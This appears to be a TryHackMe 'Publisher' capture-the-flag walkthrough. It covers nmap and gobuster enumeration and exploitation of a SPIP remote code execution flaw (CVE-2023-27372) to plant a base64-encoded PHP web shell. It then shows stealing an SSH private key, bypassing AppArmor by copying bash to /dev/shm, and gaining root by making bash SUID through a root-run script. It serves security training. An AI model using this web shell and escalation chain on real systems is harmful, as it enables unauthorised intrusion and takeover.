Publisher - TryHackme
In "Publisher", we began by scanning the target with Nmap, identifying an open SSH port and an Apache web server running a SPIP blog. Directory fuzzing led us to a SPIP installation, which we exploited using CVE-2023–27372 to achieve Remote Code Execution (RCE). We then uploaded a web shell, retrieved a private RSA key, and used it to establish SSH access. Privilege escalation was achieved by modifying a script linked to a SUID binary. Despite restrictions from AppArmor and limited directory access, we ultimately bypassed them by exploiting a kernel library, gaining root access.
Lets begin with Nmap scan

nmap 10.10.177.2 -A

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

HTTP service is running on port 80 seems to be a blog about a softwate called SPIP
SPIP can refer to Scanning Probe Image Processor software, a content management system, or a separated parents information program.
There's nothing interesting in the template so lets do a directory search

gobuster dir -u http://10.10.177.2/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

We found something interesting called 'SPIP'
We found the version of SPIP using wappalyzer extension(alternatively we can use whatweb).
I found SPIP v4.2.0 - Remote Code Execution (Unauthenticated) on Exploit-db

Exploitation

I have base64 encoded this payload and sent it to the application exploiting our RCE to create for a "shell.php" file:
<?=`$_GET[0]`?>
PD89YCRfR0VUWzBdYD8+

python2 exploit.py -u http://{ip}/spip/ -c 'echo PD89YCRfR0VUWzBdYD8+|base64 -d>shell.php'

We got the id_rsa
Lets give the required permission.
chmod 600 id_rsa

Shell as Think
ssh think@10.10.177.2 -i id_rsa

Shell as root
Lets find SUID that executes with root privilage.
find / -perm -u=s -type f 2>/dev/null

The owner of this binary is root . Due to the bit being set when this binary is run, it will run as the owner , that is root . We have now found out the path to get to root.
Upon running it we get an error from a file named run_container.sh that is present within the /opt directory. This means that the binary is running that script.
Hmmm… its strange.

The script file's owner and group are both root and we as the user think has read, write & execute permissions on the file as think falls under others.
This means that there is something running on the machine that is making the file permissions too under it's control and restricting us. The best way to see what exactly could be going on is to see what services are running on the machine.

Checking for running services:
service --status-all | grep '+'

We found the culprit. apparmor
Apparmor is a Linux security module used to restrict an applications capabilities based on their apparmor profiles.

Lets check shell environment:
ps -p $$ -o args=

getent passwd think
The output of these commands shows that we are indeed on an ash shell.

Explanation:
/usr/sbin/ash flags=(complain): This shows that the profile for the ash binary is in complain mode, where violations are logged but not enforced/blocked.
cp /bin/bash /dev/shm
ls -la /dev/shm

/dev/shm/bash
We are able to copy the bash binary to /dev/shm because we as the user think has read permissions on the bash binary itself as we fall under others, and due to the fact that /dev/shm is writable
This shows that we have successfully bypassed AppArmor's security restrictions that affected the ash shell that we as the user think was on by default.
Writing into run_container.sh
echo 'chmod u+s /bin/bash' > run_container.sh

/usr/sbin/run_container

bash -p
Congratulations! We have successfully completed this machine. Thank you for reading!
